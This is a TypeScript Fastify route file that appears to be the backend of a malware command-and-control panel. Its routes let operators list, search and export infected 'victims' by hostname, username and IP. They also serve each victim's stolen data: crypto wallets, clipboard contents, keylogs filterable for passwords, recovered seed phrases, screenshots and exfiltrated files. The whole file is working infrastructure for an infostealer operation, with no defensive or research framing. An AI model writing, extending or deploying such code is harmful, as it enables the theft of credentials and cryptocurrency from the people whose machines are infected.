import type { FastifyPluginAsync } from 'fastify';
import { z } from 'zod';
import { createReadStream } from 'node:fs';
import { stat } from 'node:fs/promises';
import { join } from 'node:path';
import { prisma } from '../lib/db';
import { audit } from '../lib/audit';
import { notFound } from '../lib/errors';
import { requireRole } from '../plugins/auth';
import { artifactDir, safeRel } from '../services/artifact';
import { publish } from '../lib/bus';

const listQuery = z.object({
  q: z.string().max(128).optional(),
  os: z.string().max(32).optional(),
  country: z.string().max(64).optional(),
  status: z.enum(['online', 'stale', 'offline', 'revoked']).optional(),
  tag: z.string().max(64).optional(),
  build: z.string().uuid().optional(),
  cursor: z.string().uuid().optional(),
  limit: z.coerce.number().int().min(1).max(200).default(50)
});

const tagSchema = z.object({ tags: z.array(z.string().max(32)).max(24) });

export const victimRoutes: FastifyPluginAsync = async (app) => {
  app.get('/victims', async (request) => {
    const query = listQuery.parse(request.query);
    const rows = await prisma.victim.findMany({
      where: {
        ...(query.os ? { os: query.os } : {}),
        ...(query.country ? { country: query.country } : {}),
        ...(query.status ? { status: query.status } : {}),
        ...(query.tag ? { tags: { has: query.tag } } : {}),
        ...(query.build ? { buildId: query.build } : {}),
        ...(query.q
          ? {
              OR: [
                { hostname: { contains: query.q, mode: 'insensitive' } },
                { username: { contains: query.q, mode: 'insensitive' } },
                { ip: { contains: query.q } },
                { tags: { has: query.q } }
              ]
            }
          : {})
      },
      orderBy: [{ lastHeartbeatAt: 'desc' }, { id: 'asc' }],
      ...(query.cursor ? { cursor: { id: query.cursor }, skip: 1 } : {}),
      take: query.limit,
      include: {
        build: { select: { name: true, version: true } },
        _count: { select: { wallets: true, artifacts: true } }
      }
    });
    return {
      items: rows.map((row) => ({
        ...row,
        online: Date.now() - row.lastHeartbeatAt.getTime() < 90_000,
        wallets: row._count.wallets,
        artifacts: row._count.artifacts,
        _count: undefined
      })),
      next: rows.length === query.limit ? rows.at(-1)?.id : null
    };
  });

  app.get('/victims/export.csv', async (request, reply) => {
    const query = listQuery.parse(request.query);
    const rows = await prisma.victim.findMany({
      where: {
        ...(query.os ? { os: query.os } : {}),
        ...(query.country ? { country: query.country } : {}),
        ...(query.status ? { status: query.status } : {})
      },
      orderBy: { lastHeartbeatAt: 'desc' },
      take: 10000
    });
    const head = 'id,hostname,username,os,os_version,country,ip,status,profile,tags,first_seen,last_heartbeat\n';
    const body = rows
      .map((row) =>
        [
          row.id,
          row.hostname,
          row.username,
          row.os,
          row.osVersion,
          row.country ?? '',
          row.ip ?? '',
          row.status,
          row.profile,
          row.tags.join('|'),
          row.firstSeenAt.toISOString(),
          row.lastHeartbeatAt.toISOString()
        ]
          .map((value) => `"${String(value).replace(/"/g, '""')}"`)
          .join(',')
      )
      .join('\n');
    reply.header('content-type', 'text/csv; charset=utf-8');
    reply.header('content-disposition', 'attachment; filename="victims.csv"');
    await audit(prisma, { operatorId: request.operator?.id, action: 'export.victims', entity: 'victim', ip: request.clientIp });
    return head + body;
  });

  app.get('/victims/:id', async (request) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const victim = await prisma.victim.findUnique({
      where: { id },
      include: {
        build: { select: { id: true, name: true, version: true, buildId: true } },
        _count: { select: { wallets: true, artifacts: true, tasks: true, clipboard: true, keylogs: true } }
      }
    });
    if (!victim) throw notFound('victim');
    const balanceCount = await prisma.wallet.count({ where: { victimId: id, NOT: { balance: null } } });
    return { ...victim, online: Date.now() - victim.lastHeartbeatAt.getTime() < 90_000, balances: balanceCount };
  });

  app.patch('/victims/:id', { preHandler: requireRole('operator') }, async (request) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const input = tagSchema.parse(request.body);
    const victim = await prisma.victim.update({ where: { id }, data: { tags: input.tags }, select: { id: true, tags: true } });
    await audit(prisma, { operatorId: request.operator?.id, action: 'victim.tags', entity: 'victim', entityId: id, ip: request.clientIp, data: { tags: input.tags } });
    return victim;
  });

  app.post('/victims/:id/revoke', { preHandler: requireRole('operator') }, async (request) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const revoked = (request.query as { restore?: string }).restore === '1' ? null : new Date();
    await prisma.victim.update({ where: { id }, data: { revokedAt: revoked, status: revoked ? 'revoked' : 'offline' } });
    await audit(prisma, { operatorId: request.operator?.id, action: revoked ? 'victim.revoke' : 'victim.restore', entity: 'victim', entityId: id, ip: request.clientIp });
    void publish({ type: 'victim.heartbeat', victimId: id, at: Date.now(), data: { status: revoked ? 'revoked' : 'offline' } });
    return { ok: true };
  });

  app.delete('/victims/:id', { preHandler: requireRole('admin') }, async (request) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    await prisma.victim.delete({ where: { id } });
    await audit(prisma, { operatorId: request.operator?.id, action: 'victim.delete', entity: 'victim', entityId: id, ip: request.clientIp });
    return { ok: true };
  });

  app.get('/victims/:id/wallets', async (request) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const items = await prisma.wallet.findMany({ where: { victimId: id }, orderBy: [{ state: 'asc' }, { createdAt: 'desc' }], take: 1000 });
    return { items };
  });

  app.get('/victims/:id/clipboard', async (request) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const query = z.object({ q: z.string().max(256).default(''), cursor: z.string().optional(), limit: z.coerce.number().int().max(200).default(100) }).parse(request.query);
    const items = await prisma.clipboardEntry.findMany({
      where: { victimId: id, ...(query.q ? { content: { contains: query.q, mode: 'insensitive' } } : {}) },
      orderBy: { ts: 'desc' },
      take: query.limit,
      ...(query.cursor ? { cursor: { id: query.cursor }, skip: 1 } : {})
    });
    return { items, next: items.length === query.limit ? items.at(-1)?.id : null };
  });

  app.get('/victims/:id/keylogs', async (request) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const query = z.object({ q: z.string().max(256).default(''), password: z.enum(['0', '1']).default('0'), limit: z.coerce.number().int().max(500).default(200) }).parse(request.query);
    const items = await prisma.keylog.findMany({
      where: {
        victimId: id,
        ...(query.password === '1' ? { password: true } : {}),
        ...(query.q ? { OR: [{ text: { contains: query.q, mode: 'insensitive' } }, { title: { contains: query.q, mode: 'insensitive' } }] } : {})
      },
      orderBy: { ts: 'desc' },
      take: query.limit
    });
    return { items };
  });

  app.get('/victims/:id/seeds', async (request) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const events = await prisma.event.findMany({ where: { victimId: id, kind: 'seed_found' }, orderBy: { createdAt: 'desc' }, take: 500 });
    return {
      items: events.map((event) => {
        const data = event.data as { path?: string; type?: string; words?: number; value?: string };
        return { id: event.id, path: data.path ?? '', type: data.type ?? 'unknown', words: data.words ?? 0, value: data.value ?? '', createdAt: event.createdAt };
      })
    };
  });

  app.get('/victims/:id/events', async (request) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const items = await prisma.event.findMany({ where: { victimId: id }, orderBy: { createdAt: 'desc' }, take: 500 });
    return { items };
  });

  app.get('/victims/:id/files', async (request) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const artifacts = await prisma.artifact.findMany({
      where: { victimId: id, status: 'ready' },
      orderBy: { createdAt: 'desc' },
      take: 50,
      select: { id: true, module: true, bytes: true, manifest: true, createdAt: true }
    });
    return {
      artifacts: artifacts.map((artifact) => ({
        id: artifact.id,
        module: artifact.module,
        bytes: artifact.bytes,
        createdAt: artifact.createdAt,
        files: ((artifact.manifest as { artifacts?: Array<{ path: string; size: number; kind: string }> } | null)?.artifacts ?? []).map((file) => ({
          path: file.path,
          size: file.size,
          kind: file.kind
        }))
      }))
    };
  });

  app.get('/victims/:id/screenshots', async (request) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const items = await prisma.screenshot.findMany({ where: { victimId: id }, orderBy: { ts: 'desc' }, take: 200 });
    return { items };
  });

  app.get('/artifacts/:id/file', async (request, reply) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const filePath = String((request.query as { path?: string }).path ?? '');
    if (!filePath) throw notFound('file');
    const artifact = await prisma.artifact.findUnique({ where: { id } });
    if (!artifact || artifact.status !== 'ready') throw notFound('artifact');
    const manifest = artifact.manifest as { artifacts?: Array<{ path: string; size: number }> } | null;
    const entry = manifest?.artifacts?.find((item) => item.path === filePath);
    if (!entry) throw notFound('file');
    const full = join(artifactDir(artifact.id), safeRel(entry.path));
    const info = await stat(full);
    reply.header('content-type', 'application/octet-stream');
    reply.header('content-length', info.size);
    reply.header('content-disposition', `attachment; filename="${encodeURIComponent(entry.path.split('/').pop() ?? 'file')}"`);
    return reply.send(createReadStream(full));
  });

  app.get('/artifacts/:id/raw', async (request, reply) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const artifact = await prisma.artifact.findUnique({ where: { id } });
    if (!artifact) throw notFound('artifact');
    reply.header('content-type', 'application/octet-stream');
    return reply.send(createReadStream(artifact.containerPath));
  });

  app.get('/screenshots/:id/image', async (request, reply) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const shot = await prisma.screenshot.findUnique({ where: { id }, include: { artifact: true } });
    if (!shot) throw notFound('screenshot');
    const manifest = shot.artifact.manifest as { artifacts?: Array<{ path: string; kind: string }> } | null;
    const entry = manifest?.artifacts?.find((item) => item.kind === 'screenshot') ?? manifest?.artifacts?.[0];
    if (!entry) throw notFound('screenshot');
    reply.header('content-type', 'image/png');
    return reply.send(createReadStream(join(artifactDir(shot.artifactId), safeRel(entry.path))));
  });
};
